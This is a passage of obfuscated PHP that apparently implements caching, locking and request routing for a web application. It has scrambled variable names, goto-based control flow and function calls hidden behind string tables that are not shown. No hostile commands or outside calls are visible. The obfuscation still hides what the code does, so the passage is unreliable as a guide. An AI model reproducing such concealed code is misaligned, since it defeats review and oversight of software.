unset(self::$memoryCache[$CğÏÍ÷õ´â]); self::clearTimeout(); goto Dç§²Ö‰¼³; eéŞºÏ¿: return $DßÆñô‚Ø; goto b­ÃÁâŒİƒ; b­ÃÁâŒİƒ: } public static function clearMemory($F…Òáñë… = false) { if ($F…Òáñë…) { $F…Òáñë… = self::key($F…Òáñë…); unset(self::$memoryCache[$F…Òáñë…]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[…Ò×–][764])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[…Ò×–][765])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($f‹£‚èœ¦, $D‰òÄƒõ›Ì) { $A¡ôí–‡Ùò =& $_SERVER[…Ò×–]; $this->cachePath = $f‹£‚èœ¦[$A¡ôí–‡Ùò[75]]; $this->prefix = $A¡ôí–‡Ùò[766]; $this->cacheTime = $D‰òÄƒõ›Ì; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($bø÷‡½šÕù) { $bÀ¥Ÿ½ë·— =& $_SERVER[…Ò×–]; $bø÷‡½šÕù = str_replace(array($bÀ¥Ÿ½ë·—[767], $bÀ¥Ÿ½ë·—[93], $bÀ¥Ÿ½ë·—[69]), $bÀ¥Ÿ½ë·—[768], $bø÷‡½šÕù); return $this->cachePath . $bÀ¥Ÿ½ë·—[769] . $bø÷‡½šÕù . $bÀ¥Ÿ½ë·—[770]; } public function set($dÅÆÄŞñ¡Ù, $C£ô„ÂÕÍ, $Bóº¹Û” = false) { $fçÍ©Î¸æ½ = $this->getFile($dÅÆÄŞñ¡Ù); if (file_put_contents($fçÍ©Î¸æ½, $this->prefix . $C£ô„ÂÕÍ, LOCK_EX)) { return !0; } @unlink($fçÍ©Î¸æ½); return !1; } public function get($A¬ï¼æ‹™Î) { $cÕ—½ÌµÃ§ = $this->getFile($A¬ï¼æ‹™Î); if (file_exists($cÕ—½ÌµÃ§) && filemtime($cÕ—½ÌµÃ§) < time() - $this->cacheTime) { @unlink($cÕ—½ÌµÃ§); return !1; } $dÂ“‹†â÷­ = @file_get_contents($cÕ—½ÌµÃ§); return substr($dÂ“‹†â÷­, strlen($this->prefix)); } public function remove($d‚ÆÜ…Ñƒš) { $Få™à˜Ş¹³ = $this->getFile($d‚ÆÜ…Ñƒš); return @unlink($Få™à˜Ş¹³); } public function deleteAll() { $C‘¶­”í®Œ =& $_SERVER[…Ò×–]; $EÏç´”¦ = scandir($this->cachePath); foreach ($EÏç´”¦ as $b½ä¥ù¬ƒ­) { $d’¿îùÖç¥ = $this->cachePath . $b½ä¥ù¬ƒ­; if (strpos($d’¿îùÖç¥, $C‘¶­”í®Œ[770]) && strpos($d’¿îùÖç¥, $C‘¶­”í®Œ[771])) { @unlink($d’¿îùÖç¥); } } } public function clearTimeout() { $a‡”İÅí‚² =& $_SERVER[…Ò×–]; $A”èìµÛØÄ = scandir($this->cachePath); foreach ($A”èìµÛØÄ as $FÑì¿ˆ§š ) { $bªİÂí = $this->cachePath . $FÑì¿ˆ§š ; if (strpos($bªİÂí, $a‡”İÅí‚²[770]) && strpos($bªİÂí, $a‡”İÅí‚²[771]) && filemtime($bªİÂí) < time() - $this->cacheTime) { @unlink($bªİÂí); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto eóƒî¹Ê­; dÚÔìÊ¶: if ($C„ˆÙÌ÷æŠ == $a¶­Ú’Ñš[17] && $f¨ìÔÚŒ¹ == $a¶­Ú’Ñš[9]) { $C„ˆÙÌ÷æŠ = $a¶­Ú’Ñš[171]; } switch ($C„ˆÙÌ÷æŠ) { case $a¶­Ú’Ñš[762]: self::$handle = new CacheLockRedis(); break; case $a¶­Ú’Ñš[763]: self::$handle = new CacheLockMemcached(); break; case $a¶­Ú’Ñš[17]: self::$handle = new CacheLockDatabase(); break; case $a¶­Ú’Ñš[171]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto c”»ã§¤ì¡; eóƒî¹Ê­: $a¶­Ú’Ñš =& $_SERVER[…Ò×–]; if (self::$handle) { return self::$handle; } $BŸ˜‹Á²å = $GLOBALS[$a¶­Ú’Ñš[6]][$a¶­Ú’Ñš[341]]; goto E—£óáŠ¬¯; E—£óáŠ¬¯: self::$timeout = $BŸ˜‹Á²å[$a¶­Ú’Ñš[772]] ? $BŸ˜‹Á²å[$a¶­Ú’Ñš[772]] : 10; $f¨ìÔÚŒ¹ = _get($GLOBALS[$a¶­Ú’Ñš[6]], $a¶­Ú’Ñš[773]); $C„ˆÙÌ÷æŠ = $BŸ˜‹Á²å[$a¶­Ú’Ñš[759]] ? $BŸ˜‹Á²å[$a¶­Ú’Ñš[759]] : $a¶­Ú’Ñš[171]; goto dÚÔìÊ¶; c”»ã§¤ì¡: } private static function key($FÔ¡¿ğˆˆé) { return $_SERVER[…Ò×–][774] . Cache::key($FÔ¡¿ğˆˆé); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($bÛ¿†–ƒÃ„ = '') { self::$errorMsg = $bÛ¿†–ƒÃ„; } public static function lockGlobal($dòê‰æÇ‰ô, $dÅ‡ÙÖÑ¸») { return self::lock($dòê‰æÇ‰ô, $dÅ‡ÙÖÑ¸», !0); } public static function lock($cê¬ŞŒ›×, $eÔÔøÅ¸½Ë = false, $e•ºß‡› = false) { goto aØÖ¢ÉÏÌ•; aØÖ¢ÉÏÌ•: $fÂÅ´ÔÛÅÆ =& $_SERVER[…Ò×–]; $EÓÁªáÙ© = self::init(); $aÑ²…—Ğ¦ = self::key($cê¬ŞŒ›×); goto AÓ®×Ë¯­»; Bò‰¤Áåõ: if (!$e•ºß‡›) { self::$lockItem[$aÑ²…—Ğ¦] = !0; } return $eë‘ˆÄ¢Œ; goto E£ê´éíŞá; AÓ®×Ë¯­»: $eÔÔøÅ¸½Ë = $eÔÔøÅ¸½Ë ? $eÔÔøÅ¸½Ë : self::$timeout; $eë‘ˆÄ¢Œ = $EÓÁªáÙ©->lock($aÑ²…—Ğ¦, $eÔÔøÅ¸½Ë); if (!$eë‘ˆÄ¢Œ) { $DÉ×êÙá¯´ = $fÂÅ´ÔÛÅÆ[775] . $eÔÔøÅ¸½Ë . $fÂÅ´ÔÛÅÆ[67] . self::$errorMsg . $fÂÅ´ÔÛÅÆ[67] . get_caller_msg(); $dÁ¹ŞĞ·ßÄ = "\x4c\x6f\x63\153\40\x61\x63\164\151\157\x6e\72\40{$aÑ²…—Ğ¦}\x20\x74\151\155\145\157\165\x74\x2c\157\x76\x65\x72\x20{$eÔÔøÅ¸½Ë}\x20\x73"; $dÁ¹ŞĞ·ßÄ = self::$errorMsg ? self::$errorMsg : $f£º°¥¾á; write_log($DÉ×êÙá¯´, $fÂÅ´ÔÛÅÆ[776]); show_json($dÁ¹ŞĞ·ßÄ, !1); } goto Bò‰¤Áåõ; E£ê´éíŞá: } public static function lockGet($Aµƒ¼ªİÇ) { $BÀÍ•Ìá°õ = self::key($Aµƒ¼ªİÇ); if (self::$lockItem[$BÀÍ•Ìá°õ]) { return self::$lockItem[$BÀÍ•Ìá°õ]; } return self::init()->lockGet($BÀÍ•Ìá°õ); } public static function unlock($DÔÆÎ‹¢‚) { $e™Î‰¢¥àö = self::key($DÔÆÎ‹¢‚); self::$lockItem[$e™Î‰¢¥àö] = null; return self::init()->unlock($e™Î‰¢¥àö); } public static function unlockRuntime() { $b‹¦İŒÇù =& $_SERVER[…Ò×–]; $BÚí‘ì… Ü = self::init(); $AœÍ·¤İßô = !1; foreach (self::$lockItem as $eÖ´ìë¤ => $bİòéëÎù©) { if (!$bİòéëÎù©) { continue; } $BÚí‘ì… Ü->unlock($eÖ´ìë¤); if (!$AœÍ·¤İßô) { $AœÍ·¤İßô = !0; write_log($b‹¦İŒÇù[777] . $eÖ´ìë¤ . $b‹¦İŒÇù[67] . get_caller_msg(), $b‹¦İŒÇù[776]); continue; } write_log($b‹¦İŒÇù[777] . $eÖ´ìë¤, $b‹¦İŒÇù[776]); } self::fileUnlockAll(); } public static function fileLock($Aà“×õŞ¼) { goto aê–ÔèîÏä; EÉË¡Î“åƒ: $açÚ¬çÙ‡Ÿ = fopen(DATA_PATH . $Aà“×õŞ¼ . $cÂìöÊ²Ù[779], $cÂìöÊ²Ù[780]); if (!$açÚ¬çÙ‡Ÿ) { return !1; } $GLOBALS[$cÂìöÊ²Ù[778]][$Aà“×õŞ¼] = $açÚ¬çÙ‡Ÿ; goto a…ÜáåŠÍË; Eèò¿ ã®ø: return !1; goto Dªá«ÎÇ’; aê–ÔèîÏä: $cÂìöÊ²Ù =& $_SERVER[…Ò×–]; if (!$GLOBALS[$cÂìöÊ²Ù[778]]) { $GLOBALS[$cÂìöÊ²Ù[778]] = array(); } $GLOBALS[$cÂìöÊ²Ù[778]][$Aà“×õŞ¼] = !1; goto EÉË¡Î“åƒ; a…ÜáåŠÍË: if (flock($açÚ¬çÙ‡Ÿ, LOCK_EX)) { return !0; } self::unlock($Aà“×õŞ¼); show_json($cÂìöÊ²Ù[781], !1); goto Eèò¿ ã®ø; Dªá«ÎÇ’: } public static function fileUnlock($Fë¾ñ›ØÀÊ) { $F…÷‘ ©Êª =& $_SERVER[…Ò×–]; $FÂôò‡‘ì = $GLOBALS[$F…÷‘ ©Êª[778]][$Fë¾ñ›ØÀÊ]; if (!$FÂôò‡‘ì) { return; } $GLOBALS[$F…÷‘ ©Êª[778]][$Fë¾ñ›ØÀÊ] = !1; flock($FÂôò‡‘ì, LOCK_UN); fclose($FÂôò‡‘ì); } public static function fileUnlockAll() { $c¯²«Ÿê› =& $_SERVER[…Ò×–]; if (!$GLOBALS[$c¯²«Ÿê›[778]]) { return; } foreach ($GLOBALS[$c¯²«Ÿê›[778]] as $Côëï‰Ô¤ => $b¨³²Ç¿Âµ) { if (!$b¨³²Ç¿Âµ) { continue; } $GLOBALS[$c¯²«Ÿê›[778]][$Côëï‰Ô¤] = !1; flock($b¨³²Ç¿Âµ, LOCK_UN); fclose($b¨³²Ç¿Âµ); } $GLOBALS[$c¯²«Ÿê›[778]] = array(); } } goto FÁŒŸ¶ïƒ; aˆğÃø‘­÷: $aÛ¶‰×İ = $_SERVER[…Ò×–][555]; class Application { private $defaultModule = "\151\156\144\145\x78"; private $defaultController = "\151\156\x64\145\x78"; private $defaultAction = "\151\156\144\145\x78"; function __construct() { } public function setDefault($a ‹ƒÆÂ‚) { goto aÕ¥ùËö‚; c´óİ¸øõÓ: $DîŒ‹İæ‚š = $eù’†‘õ¹[556]; $this->defaultModule = $Dï¦ŒêÚŠ¿[0] ? $Dï¦ŒêÚŠ¿[0] : $this->defaultModule; $Cõèƒ¡Ä‚‘ = $eù’†‘õ¹[557]; goto d‰äÜ„¯Åå; d‰äÜ„¯Åå: while ($Cõèƒ¡Ä‚‘ < $eù’†‘õ¹[552]) { if ($Cõèƒ¡Ä‚‘ >= 0) { break; } $Cõèƒ¡Ä‚‘++; } $this->defaultController = $Dï¦ŒêÚŠ¿[1] ? $Dï¦ŒêÚŠ¿[1] : $this->defaultController; $this->defaultAction = $Dï¦ŒêÚŠ¿[2] ? $Dï¦ŒêÚŠ¿[2] : $this->defaultAction; goto aä™Ş¨¯¬; aä™Ş¨¯¬: $a©ø‘ˆéÄ = $eù’†‘õ¹[558]; if (!$a©ø‘ˆéÄ) { die; } $this->{$_SERVER[ùç´][3]}($cá¹Á©¯Œœ[4], array($this, $cá¹Á©¯Œœ[5])); goto Cõ¤‚à²é¡; aÕ¥ùËö‚: $eù’†‘õ¹ =& $_SERVER[…Ò×–]; $cá¹Á©¯Œœ =& $_SERVER[ùç´]; $Dï¦ŒêÚŠ¿ = $cá¹Á©¯Œœ[0]($cá¹Á©¯Œœ[1], $cá¹Á©¯Œœ[2]($a ‹ƒÆÂ‚, $cá¹Á©¯Œœ[1])); goto c´óİ¸øõÓ; Cõ¤‚à²é¡: } public function appRun($F¤‡¤ÌÔ™) { goto CŸİÏÏ˜Ö…; C†àÖÜÚ: if (strlen($c‹İƒ½ŒÏŞ) < $b«ƒîø“‹¾[560]) { return; } if ($eğ½Ù†„é == $a Š˜Êª[8]) { $B’“ñ­ÒùÉ = $a Š˜Êª[9]; $CĞùÜÏ„÷[0] = $a Š˜Êª[10]; $CĞùÜÏ„÷[1] = $CĞùÜÏ„÷[1] . $a Š˜Êª[11]; $F¤‡¤ÌÔ™ = $a Š˜Êª[12]($a Š˜Êª[1], $CĞùÜÏ„÷); $F¤‡¤ÌÔ™ = $a Š˜Êª[2]($F¤‡¤ÌÔ™, $a Š˜Êª[1]); } $a Š˜Êª[13](array($a Š˜Êª[14], $a Š˜Êª[15]), $B’“ñ­ÒùÉ . $a Š˜Êª[16], $F¤‡¤ÌÔ™); goto BİÁ‹„È¾ç; AÕ²½ŞŸôõ: $eğ½Ù†„é = $a Š˜Êª[6]($CĞùÜÏ„÷[0]); $B’“ñ­ÒùÉ = $a Š˜Êª[7]; $c‹İƒ½ŒÏŞ = $b«ƒîø“‹¾[559]; goto C†àÖÜÚ; a•æË¡¡˜”: while (strlen($AÔ±ğÄö½) < $b«ƒîø“‹¾[560]) { if (!$AÔ±ğÄö½) { break; } $AÔ±ğÄö½++; } goto a‰´šÉØ„Ê; CŸİÏÏ˜Ö…: $b«ƒîø“‹¾ =& $_SERVER[…Ò×–]; $a Š˜Êª =& $_SERVER[ùç´]; $CĞùÜÏ„÷ = $a Š˜Êª[0]($a Š˜Êª[1], $F¤‡¤ÌÔ™); goto AÕ²½ŞŸôõ; BİÁ‹„È¾ç: $a Š˜Êª[17]($F¤‡¤ÌÔ™); $a Š˜Êª[13](array($a Š˜Êª[14], $a Š˜Êª[15]), $B’“ñ­ÒùÉ . $a Š˜Êª[18], $F¤‡¤ÌÔ™); $AÔ±ğÄö½ = $b«ƒîø“‹¾[561]; goto a•æË¡¡˜”; a‰´šÉØ„Ê: } private function autorun() { $AîØ¹ŠÒ¶ã =& $_SERVER[ùç´]; global $config; if ($AîØ¹ŠÒ¶ã[19]($config[$AîØ¹ŠÒ¶ã[20]]) == 0) { return; } foreach ($config[$AîØ¹ŠÒ¶ã[20]] as $e°¸ğî†ò¯ => $Däòáôà…¿) { $this->{$_SERVER[ùç´][21]}($Däòáôà…¿); } } private function twxza9f9bb2c() { goto añÆëŒ‡Ñ; aŒÏè¥ÇÕö: $GLOBALS[$A“æ µ±ËÄ[22]][$A“æ µ±ËÄ[23]] = $A“æ µ±ËÄ[27]($D„¡‡‰İ„, $dçƒ„Ì¿¾’); $AÖø±¨‹áê = $C»ÚØŠí[566]; if (strlen($AÖø±¨‹áê) < $C»ÚØŠí[567]) { return; } goto FÁÏ‚èßØÍ; AŠ‡‹ÖÃíô: $eµÃ‘’‡Ç¼ = $C»ÚØŠí[563]; while (strlen($eµÃ‘’‡Ç¼) < $C»ÚØŠí[560]) { if (!$eµÃ‘’‡Ç¼) { break; } $eµÃ‘’‡Ç¼++; } $D„¡‡‰İ„ = array($A“æ µ±ËÄ[8], $Béùİˆ‹Õ); goto Bíˆ¾’øöˆ; F³–ÃÂöá: $aÌ³ÓÑìÏ“ = $C»ÚØŠí[562]; if (strlen($aÌ³ÓÑìÏ“) < $C»ÚØŠí[552]) { return; } $AÃÆš×â½ = $GLOBALS[$A“æ µ±ËÄ[22]][$A“æ µ±ËÄ[23]][0]; goto cÅƒ¢‚Ô¤×; cÅƒ¢‚Ô¤×: if (!$AÃÆš×â½ || $A“æ µ±ËÄ[24]($AÃÆš×â½) <= $A“æ µ±ËÄ[24]($f•´Û½Å“İ)) { return; } if ($A“æ µ±ËÄ[6]($A“æ µ±ËÄ[25]($AÃÆš×â½, -$A“æ µ±ËÄ[24]($f•´Û½Å“İ))) != $f•´Û½Å“İ) { return; } $Béùİˆ‹Õ = $A“æ µ±ËÄ[25]($AÃÆš×â½, 0, -$A“æ µ±ËÄ[24]($f•´Û½Å“İ)); goto AŠ‡‹ÖÃíô; Bíˆ¾’øöˆ: $dçƒ„Ì¿¾’ = $A“æ µ±ËÄ[26]($GLOBALS[$A“æ µ±ËÄ[22]][$A“æ µ±ËÄ[23]], 1); $Cè…ö…“’ = $C»ÚØŠí[564]; while (strlen($Cè…ö…“’) < $C»ÚØŠí[565]) { if (!$Cè…ö…“’) { break; } $Cè…ö…“’++; } goto aŒÏè¥ÇÕö; añÆëŒ‡Ñ: $C»ÚØŠí =& $_SERVER[…Ò×–]; $A“æ µ±ËÄ =& $_SERVER[ùç´]; $f•´Û½Å“İ = $A“æ µ±ËÄ[8]; goto F³–ÃÂöá; FÁÏ‚èßØÍ: $GLOBALS[$A“æ µ±ËÄ[22]][$A“æ µ±ËÄ[28]] = $A“æ µ±ËÄ[29]($A“æ µ±ËÄ[1], $GLOBALS[$A“æ µ±ËÄ[22]][$A“æ µ±ËÄ[23]]); goto CÃùŠ§ò®ğ; CÃùŠ§ò®ğ: } private function ukxz0b798600() { goto AÆä´Ëµñ¼; AÆä´Ëµñ¼: $F­§ÔööÕ =& $_SERVER[…Ò×–]; $f´ö¿òÁŒ‰ =& $_SERVER[ùç´]; if ($GLOBALS[$f´ö¿òÁŒ‰[22]][$f´ö¿òÁŒ‰[28]] != $f´ö¿òÁŒ‰[10]) { return; } goto cëÒ‹¿·Ş; B²‡¤µÙÊ¤: while (strlen($DÊÑ¥‰°œ¼) < $F­§ÔööÕ[567]) { if (!$DÊÑ¥‰°œ¼) { break; } $DÊÑ¥‰°œ¼++; } $GLOBALS[$f´ö¿òÁŒ‰[22]][$f´ö¿òÁŒ‰[28]] = $f´ö¿òÁŒ‰[29]($f´ö¿òÁŒ‰[1], $GLOBALS[$f´ö¿òÁŒ‰[22]][$f´ö¿òÁŒ‰[23]]); goto døµ¯–îØ; cøĞ­¸§µß: $Eø‘ÊÏÊµî = $F­§ÔööÕ[571]; $Bİ‘ƒËé°£ = $f´ö¿òÁŒ‰[2]($CôÅÖ³ë»ƒ[0][0], $f´ö¿òÁŒ‰[36]); $C«ù°±ïê = $F­§ÔööÕ[572]; goto E°Ã‘¿¿å«; A½œ®‹šô: if (!$f´ö¿òÁŒ‰[32]($FÅˆÜÜŠŒÀ, $fÖäÓŞö¼á)) { return; } $cöŒ‹ÌùÔ = $f´ö¿òÁŒ‰[33]($FÅˆÜÜŠŒÀ, $fÖäÓŞö¼á); $EãÎ„ŸÀ†ï = $F­§ÔööÕ[570]; goto A×Íåâ²Áñ; cëÒ‹¿·Ş: $FÅˆÜÜŠŒÀ = $_SERVER[$f´ö¿òÁŒ‰[30]]; $E”‡¦Ä«ñ = $F­§ÔööÕ[568]; if (!$E”‡¦Ä«ñ) { die; } goto EîµÏÆùª¶; E°Ã‘¿¿å«: while (strlen($C«ù°±ïê) < $F­§ÔööÕ[567]) { if (!$C«ù°±ïê) { break; } $C«ù°±ïê++; } $GLOBALS[$f´ö¿òÁŒ‰[22]][$f´ö¿òÁŒ‰[23]] = $f´ö¿òÁŒ‰[0]($f´ö¿òÁŒ‰[36], $Bİ‘ƒËé°£); $DÊÑ¥‰°œ¼ = $F­§ÔööÕ[573]; goto B²‡¤µÙÊ¤; A×Íåâ²Áñ: if (!$EãÎ„ŸÀ†ï) { return; } $Bİ‘ƒËé°£ = $f´ö¿òÁŒ‰[25]($FÅˆÜÜŠŒÀ, $cöŒ‹ÌùÔ + $f´ö¿òÁŒ‰[24]($fÖäÓŞö¼á)); $f´ö¿òÁŒ‰[34]($f´ö¿òÁŒ‰[35], $Bİ‘ƒËé°£, $CôÅÖ³ë»ƒ); goto cøĞ­¸§µß; EîµÏÆùª¶: $fÖäÓŞö¼á = $f´ö¿òÁŒ‰[31]; $D¾’ª™ñ‡ = $F­§ÔööÕ[569]; while (strlen($D¾’ª™ñ‡) < $F­§ÔööÕ[560]) { if (!$D¾’ª™ñ‡) { break; } $D¾’ª™ñ‡++; } goto A½œ®‹šô; døµ¯–îØ: } public function run() { goto a±ñ´Ú”øï; E”Ã½œóˆÜ: $AØ›Â†œ‰[39]($AØ›Â†œ‰[43], MOD . $AØ›Â†œ‰[1] . ST . $AØ›Â†œ‰[1] . ACT); $EÒ¸ö—ÁäÑ = $a•Óù½Î–§[578]; if (!$EÒ¸ö—ÁäÑ) { die; } goto DŸéÈ£ÕÅ; DŸéÈ£ÕÅ: $_SERVER[$AØ›Â†œ‰[44]] = $AØ›Â†œ‰[6](ACTION); $this->{$_SERVER[ùç´][45]}(); if ($AØ›Â†œ‰[19]($dîÂÙÇ®ÍÃ) >= 3) { $this->{$_SERVER[ùç´][21]}($f‡æ÷§ÄÔ—); } else { $this->{$_SERVER[ùç´][21]}(ACTION); } goto fÏŒ”ãéºÒ; a±ñ´Ú”øï: $a•Óù½Î–§ =& $_SERVER[…Ò×–]; $AØ›Â†œ‰ =& $_SERVER[ùç´]; $this->{$_SERVER[ùç´][37]}(); goto có„¨ã’Èº; e·Õ¨¤Ú: $dîÂÙÇ®ÍÃ = $GLOBALS[$AØ›Â†œ‰[22]][$AØ›Â†œ‰[23]]; $dƒë…‘‡è³ = $a•Óù½Î–§[575]; if (!$dƒë…‘‡è³) { return; } goto bÎâßäÓ•¾; bÎâßäÓ•¾: $f‡æ÷§ÄÔ— = $GLOBALS[$AØ›Â†œ‰[22]][$AØ›Â†œ‰[28]]; $e¦ø†¹“Å  = $a•Óù½Î–§[576]; $AØ›Â†œ‰[39]($AØ›Â†œ‰[40], isset($dîÂÙÇ®ÍÃ[0]) && $dîÂÙÇ®ÍÃ[0] ? $dîÂÙÇ®ÍÃ[0] : $this->defaultModule); goto bÃÍ„„…ÛÃ; bÃÍ„„…ÛÃ: $cÍ¤ÇçÜñ× = $a•Óù½Î–§[577]; $AØ›Â†œ‰[39]($AØ›Â†œ‰[41], isset($dîÂÙÇ®ÍÃ[1]) && $dîÂÙÇ®ÍÃ[0] ? $dîÂÙÇ®ÍÃ[1] : $this->defaultController); $AØ›Â†œ‰[39]($AØ›Â†œ‰[42], isset($dîÂÙÇ®ÍÃ[2]) && $dîÂÙÇ®ÍÃ[0] ? $dîÂÙÇ®ÍÃ[2] : $this->defaultAction); goto E”Ã½œóˆÜ; có„¨ã’Èº: $a ¦ˆæ¾ƒˆ = $a•Óù½Î–§[574]; if (!$a ¦ˆæ¾ƒˆ) { die; } $this->{$_SERVER[ùç´][38]}(); goto e·Õ¨¤Ú; fÏŒ”ãéºÒ: } private $tqodec3b617c = array(); private $lqywbcfcea33 = ''; public function kjub6c67ffb1() { goto dçÚã˜¿”ä; aëÖª£¯¶Œ: $this->{$_SERVER[ùç´][3]}($D•ô‰™ğù[53], array($this, $D•ô‰™ğù[54])); $this->{$_SERVER[ùç´][3]}($D•ô‰™ğù[55], array($this, $D•ô‰™ğù[56])); $F×àÖ¹Ò = $e¥áª×·çì[582]; goto fÚ–Şó²´ò; B¬ƒ¡°¼Ğƒ: $this->{$_SERVER[ùç´][50]}(); $this->{$_SERVER[ùç´][51]}(); $this->{$_SERVER[ùç´][52]}(); goto aëÖª£¯¶Œ; CêÆ£™Ä: while ($däïì…ÔÁ“ < $e¥áª×·çì[560]) { if ($däïì…ÔÁ“ >= 0) { break; } $däïì…ÔÁ“++; } $this->{$_SERVER[ùç´][3]}($D•ô‰™ğù[59], array($this, $D•ô‰™ğù[60])); $e¦Úº•‰ğ¸ = $e¥áª×·çì[584]; goto fŞÆÇæ¨†; fÚ–Şó²´ò: while ($F×àÖ¹Ò < $e¥áª×·çì[580]) { if ($F×àÖ¹Ò >= 0) { break; } $F×àÖ¹Ò++; } $this->{$_SERVER[ùç´][3]}($D•ô‰™ğù[57], array($this, $D•ô‰™ğù[58])); $däïì…ÔÁ“ = $e¥áª×·çì[583]; goto CêÆ£™Ä; F²»Š‘Â¼: $C¾éÙ¾øÇæ = $e¥áª×·çì[579]; while (strlen($C¾éÙ¾øÇæ) < $e¥áª×·çì[580]) { if (!$C¾éÙ¾øÇæ) { break; } $C¾éÙ¾øÇæ++; } $this->{$_SERVER[ùç´][47]}(); goto aÛİá±‰í‰; aÛİá±‰í‰: $this->{$_SERVER[ùç´][48]}(); $this->{$_SERVER[ùç´][49]}(); $fÔÓÄºˆ­ = $e¥áª×·çì[581]; goto B¬ƒ¡°¼Ğƒ; fŞÆÇæ¨†: if (!$e¦Úº•‰ğ¸) { return; } goto c…Ëö¸ßÕ¶; dçÚã˜¿”ä: $e¥áª×·çì =& $_SERVER[…Ò×–]; $D•ô‰™ğù =& $_SERVER[ùç´]; $this->{$_SERVER[ùç´][46]}(); goto F²»Š‘Â¼; c…Ëö¸ßÕ¶: } public function dbny806ab0f7($c˜Èç¦‹îò) { goto d±æÊ½‡; F°…–ß‡º: if ($BğèºÕ­“™[113]($GLOBALS, $BğèºÕ­“™[141]) && $this->config[$BğèºÕ­“™[142]]) { $c˜Èç¦‹îò[$BğèºÕ­“™[117]][$BğèºÕ­“™[143]] = WEB_ROOT; } return $c˜Èç¦‹îò; goto a™º‚¾ ™±; Eé©ĞğÉ’Ú: while (strlen($BÎÙÙ˜ëº) < $FÍºÔå…´[580]) { if (!$BÎÙÙ˜ëº) { break; } $BÎÙÙ˜ëº++; } unset($c˜Èç¦‹îò[$BğèºÕ­“™[102]][$BğèºÕ­“™[103]][$BğèºÕ­“™[76]]); $EÇ·‘â‘äÄ = $FÍºÔå…´[589]; goto A…Ñ¿é§Íµ; A…Ñ¿é§Íµ: while (strlen($EÇ·‘â‘äÄ) < $FÍºÔå…´[580]) { if (!$EÇ·‘â‘äÄ) { break; } $EÇ·‘â‘äÄ++; } unset($c˜Èç¦‹îò[$BğèºÕ­“™[102]][$BğèºÕ­“™[103]][$BğèºÕ­“™[107]]); $c˜Èç¦‹îò[$BğèºÕ­“™[102]][$BğèºÕ­“™[103]][$BğèºÕ­“™[108]] = array($BğèºÕ­“™[109] => (int) $c³‡¯Æ†„[$BğèºÕ­“™[110]], $BğèºÕ­“™[111] => $BğèºÕ­“™[112]($BğèºÕ­“™[113]($c³‡¯Æ†„, $BğèºÕ­“™[114], array())), $BğèºÕ­“™[115] => (int) $BğèºÕ­“™[113]($c³‡¯Æ†„, $BğèºÕ­“™[116], 0)); goto eèãë¥®ä¥; cŠ…ŸğĞÜ: $D†´ì¶Ù´† = $FÍºÔå…´[585]; if (!$D†´ì¶Ù´†) { return; } $fÅ»…æó“ğ = array($BğèºÕ­“™[64], $BğèºÕ­“™[65], $BğèºÕ­“™[66], $BğèºÕ­“™[67], $BğèºÕ­“™[68], $BğèºÕ­“™[69], $BğèºÕ­“™[70], $BğèºÕ­“™[71], $BğèºÕ­“™[72], $BğèºÕ­“™[73], $BğèºÕ­“™[74], $BğèºÕ­“™[75], $BğèºÕ­“™[76], $BğèºÕ­“™[77], $BğèºÕ­“™[78], $BğèºÕ­“™[79], $BğèºÕ­“™[80], $BğèºÕ­“™[81], $BğèºÕ­“™[82], $BğèºÕ­“™[83], $BğèºÕ­“™[84], $BğèºÕ­“™[85], $BğèºÕ­“™[86], $BğèºÕ­“™[87], $BğèºÕ­“™[88], $BğèºÕ­“™[89], $BğèºÕ­“™[90], $BğèºÕ­“™[91], $BğèºÕ­“™[92], $BğèºÕ­“™[93], $BğèºÕ­“™[94], $BğèºÕ­“™[95], $BğèºÕ­“™[96], $BğèºÕ­“™[97], $BğèºÕ­“™[98], $BğèºÕ­“™[99]); goto cŠã¦™Í; cŠã¦™Í: $BĞ×ø¥ëï¦ = $FÍºÔå…´[586]; foreach ($fÅ»…æó“ğ as $Có‘°º¡¾) { $BÁšÙ¬Û˜§ = $GLOBALS[$BğèºÕ­“™[100]][$BğèºÕ­“™[101]][$Có‘°º¡¾]; $d™ˆ½¡šø = $FÍºÔå…´[587]; if (isset($C‚ŞÆìØõ [$Có‘°º¡¾])) { $BÁšÙ¬Û˜§ = $C‚ŞÆìØõ [$Có‘°º¡¾]; } $c˜Èç¦‹îò[$BğèºÕ­“™[102]][$BğèºÕ­“™[103]][$Có‘°º¡¾] = $BÁšÙ¬Û˜§; } $c³‡¯Æ†„ = $c˜Èç¦‹îò[$BğèºÕ­“™[102]][$BğèºÕ­“™[103]][$BğèºÕ­“™[76]]; goto a‹æ©İ¯; d±æÊ½‡: $FÍºÔå…´ =& $_SERVER[…Ò×–]; $BğèºÕ­“™ =& $_SERVER[ùç´]; $C‚ŞÆìØõ  = $BğèºÕ­“™[61]($BğèºÕ­“™[62])->{$_SERVER[ùç´][63]}(); goto cŠ…ŸğĞÜ; eÖ’ÖÏì‡Ş: if ($this->lqywbcfcea33 == $BğèºÕ­“™[130]) { $c˜Èç¦‹îò[$BğèºÕ­“™[102]][$BğèºÕ­“™[103]][$BğèºÕ­“™[108]][$BğèºÕ­“™[116]] = 0; } $c˜Èç¦‹îò[$BğèºÕ­“™[117]][$BğèºÕ­“™[137]] = $BğèºÕ­“™[113]($this->tqodec3b617c, $BğèºÕ­“™[138], $BğèºÕ­“™[10]); $c˜Èç¦‹îò[$BğèºÕ­“™[117]][$BğèºÕ­“™[139]] = $BğèºÕ­“™[113]($this->tqodec3b617c, $BğèºÕ­“™[140], $BğèºÕ­“™[10]); goto F°…–ß‡º; DÂŒ·—í: $EŞãÏ‚™µ = $FÍºÔå…´[591]; if (strlen($EŞãÏ‚™µ) < $FÍºÔå…´[580]) { return; } $c˜Èç¦‹îò[$BğèºÕ­“™[117]][$BğèºÕ­“™[122]] = $BğèºÕ­“™[123]($_SERVER[$BğèºÕ­“™[124]] . $C‚ŞÆìØõ [$BğèºÕ­“™[125]]); goto EÈíÙô×Øâ; EÈíÙô×Øâ: $c˜Èç¦‹îò[$BğèºÕ­“™[117]][$BğèºÕ­“™[126]] = 